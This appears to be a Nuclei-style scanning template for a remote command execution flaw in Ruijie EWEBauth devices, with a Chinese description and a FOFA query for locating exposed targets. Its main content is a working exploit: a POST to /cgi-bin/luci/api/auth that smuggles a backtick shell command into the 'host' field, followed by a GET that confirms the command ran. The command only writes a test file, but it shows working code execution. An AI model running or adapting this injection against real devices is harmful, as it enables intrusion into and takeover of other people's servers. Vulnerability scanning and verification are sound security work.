id: ruijie-EWEBauth-luci-api-auth-rce
info:
  name: 锐捷 EWEBauth cgi-bin/luci/api/auth - rce
  author: leadlife
  severity: critical
  description: 锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器
  reference: 
    - https://mp.weixin.qq.com/s/Vh64WEnrIDBBsZ6EuJqx4Q
    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3auth%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="cgi-bin/luci" && body="#f47f3e"
  tags: 2025,ruijie,rce,ewebauth

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        {"method":"checkNet","params":{"host":"`echo {{randstr}}>{{filename}}.txt`"}}
      
      - |+
        GET /cgi-bin/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and